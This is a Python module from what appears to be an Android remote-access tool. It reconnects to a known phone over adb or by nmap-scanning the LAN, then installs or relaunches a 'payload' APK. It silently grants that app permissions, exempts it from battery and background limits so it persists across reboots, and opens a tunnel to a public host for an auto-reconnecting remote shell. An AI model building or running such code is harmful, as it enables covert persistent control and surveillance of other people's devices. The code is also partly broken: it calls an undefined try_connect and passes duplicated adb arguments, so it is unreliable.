"""Re-Access (CLI 67) — reconnect to a known device and re-establish the shell.

Designed for the OFFICE case: device disconnected (Wi-Fi adb dropped, rebooted,
moved network...) → we re-find it (saved IP, LAN scan), re-attach, re-install if
needed, re-open the permanent tunnel and drop back into a shell. Keeps auto-
retrying launch while the session is up (payload restart -> re-dial).

Features:
  * remembers last-known device (usb/wifi serial + ip) in .payload-build/last-device.json
  * reconnects over adb (USB or Wi-Fi) with LAN 5555-scan fallback
  * sets battery-ignore + boot persistence (RECEIVE_BOOT_COMPLETED already in app)
  * portmap tunnel if configured, else local reverse
  * interactive shell; auto reloops on disconnect
"""
from __future__ import annotations

import json
import re
import subprocess
import time
from pathlib import Path

from modules import remoteshell
from modules.config import AppConfig
from modules.console import (
    console,
    print_error,
    print_success,
    print_warning,
    ask,
)

ROOT = Path(__file__).resolve().parent.parent
LAST_DEV = ROOT / ".payload-build" / "last-device.json"
PKG = remoteshell.PKG


def save_last_device(serial: str, ip: str = "") -> None:
    try:
        LAST_DEV.parent.mkdir(parents=True, exist_ok=True)
        LAST_DEV.write_text(json.dumps({"serial": serial, "ip": ip}, indent=2))
    except Exception:
        pass


def load_last_device() -> dict:
    try:
        return json.loads(LAST_DEV.read_text())
    except Exception:
        return {}


def _adb(args: list[str], serial: str | None = None):
    cmd = ["adb"] + (["-s", serial] if serial else []) + args
    return subprocess.run(cmd, capture_output=True, text=True)


def find_device() -> tuple[str, bool]:
    """Return (serial, is_wireless) of a reachable device, or (None, False)."""
    out = _adb(["devices"]).stdout
    for line in out.splitlines()[1:]:
        p = line.split()
        if len(p) >= 2 and p[1] == "device":
            return p[0], (":" in p[0])
    return None, False


def try_reconnect(known_ip: str, attempts: int = 3) -> bool:
    if not known_ip:
        return False
    for _ in range(attempts):
        r = _adb(["connect", f"{known_ip}:5555"])
        if "connected" in r.stdout:
            return True
        time.sleep(2)
    return False


def lan_scan_for_adb(scan_cmd: str | None = None) -> str | None:
    """Find an open 5555 host on the LAN (needs nmap), return serial ip:5555."""
    try:
        import ipaddress

        # local ip via socket trick
        import socket

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        local = s.getsockname()[0]
        s.close()
        subnet = str(ipaddress.IPv4Network(f"{local}/24", strict=False))
    except Exception:
        return None
    try:
        r = subprocess.run(
            ["nmap", "-p", "5555", "-sT", "--open", "-T4", subnet],
            capture_output=True, text=True, timeout=30,
        )
        hits = []
        for line in r.stdout.splitlines():
            m = re.match(r"^Nmap scan report for (\d+\.\d+\.\d+\.\d+)", line)
            if m:
                hits.append(m.group(1))
    except Exception:
        return None
    for ip in hits:
        if try_reconnect(ip, 1):
            return f"{ip}:5555"
    return None


def relaunch_payload(serial: str) -> None:
    remoteshell._a(serial, ["shell", "dumpsys", "deviceidle", "whitelist", "+" + PKG])
    remoteshell._a(serial, ["shell", "am", "force-stop", PKG])
    time.sleep(1)
    remoteshell._a(serial, ["shell", "am", "start", "-n", f"{PKG}/.MainActivity"])


def reaccess(config: AppConfig) -> None:
    console.print("\n[bold cyan]▸ RE-ACCESS[/bold cyan]  reconnect device → shell\n")

    # ---- 1) find device ----------------------------------------------------
    serial, is_wire = find_device()
    known = load_last_device()
    if not serial and known.get("ip"):
        print_warning(f"trying saved device IP {known['ip']}:5555 …")
        if try_connect(known["ip"]):
            serial, is_wire = find_device()
    if not serial:
        print_warning("scanning LAN for ADB (5555) …")
        hit = lan_scan_for_adb()
        if hit:
            serial, is_wire = hit, True
    if not serial:
        print_error(
            "no device reachable.\n"
            "  • plug via USB, or\n"
            "  • ensure wireless debugging is on and same Wi-Fi, or\n"
            "  • choose 5 (Auto-Pivot) to re-prime from USB.\n"
            "Nothing was changed — try again after connecting."
        )
        return

    save_last_device(serial, serial.split(":")[0] if is_wire else "")
    print_success(f"device: {serial} ({'wireless' if is_wire else 'USB'})")

    # ---- 2) ensure payload + permissions --------------------------------
    if not is_wire:
        # USB: unique prime for reliable adb local channel
        _adb(["-s", serial, "tcpip", "5555"])
    pkgs = _adb(["shell", "pm", "list", "packages"], serial).stdout
    if not pkgs or PKG not in pkgs:
        print("payload not installed — installing…")
        apk = remoteshell.build_fgs_payload("127.0.0.1", remoteshell.LPORT)
        if not apk or not remoteshell.install_and_launch(serial, apk):
            print_error("install failed — run 66 for tunnel setup first or check USB")
            return
    else:
        print("payload present ✓")
        for perm in remoteshell.PERMISSIONS:
            remoteshell._a(serial, ["shell", "pm", "grant", PKG, f"android.permission.{perm}"])
        remoteshell._a(serial, ["shell", "dumpsys", "deviceidle", "whitelist", "+" + PKG])
        remoteshell._a(serial, ["shell", "cmd", "appops", "set", PKG, "RUN_IN_BACKGROUND", "allow"])
        remoteshell._a(serial, ["shell", "cmd", "appops", "set", PKG, "RUN_ANY_IN_BACKGROUND", "allow"])
        # ask user once for battery-ignore (persists reboots)
        _ask_battery_ignore(serial)

    # ---- 3) tunnel + reverse --------------------------------------------
    pm = remoteshell.loadportmap_config()
    tun = None
    if pm:
        print(f"[dim]portmap configured: {pm['dial_host']}:{pm['public_port']} → local:{remoteshell.LPORT}[/dim]")
        tun = remoteshell.open_tunnel("portmap")
        if tun and tun.endpoint_host:
            print_success(f"tunnel: {tun.endpoint}")
        else:
            print_warning("tunnel failed — using local reverse only")
            remoteshell.set_reverse(serial, remoteshell.LPORT)
    else:
        remoteshell.set_reverse(serial, remoteshell.LPORT)

    # ---- 4) shell (auto-reloop) ----------------------------------------
    print("\n[bold cyan]▓▓ RE-ACCESS READY ▓▓[/bold cyan]  (auto-retry on disconnect)")
    while True:
        relaunch_payload(serial)
        try:
            remoteshell.run_shell(timeout=120)
        except (KeyboardInterrupt, EOFError):
            break
        print_warning("session dropped — retrying in 8s…")
        for i in range(8):
            time.sleep(1)
            if i == 0 and not _device_alive(serial):
                break
    if tun:
        remoteshell.stop_tunnel(tun)


def _ask_battery_ignore(serial: str) -> None:
    """Prompt once to open the ignore-battery-optimization screen (persists boot)."""
    try:
        from modules.console import confirm

        if confirm("Open battery-optimization ignore for the payload? (kills XOS auto-kill)"):
            _adb(["shell", "am", "start", "-a", "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                  "-d", f"package:{PKG}"], serial)
            print("[dim]Press allow/ignore on the phone, then Enter…[/dim]")
            ask("")
    except Exception:
        pass


def _device_alive(serial: str) -> bool:
    r = remoteshell._a(serial, ["shell", "echo", "1"])
    return r.returncode == 0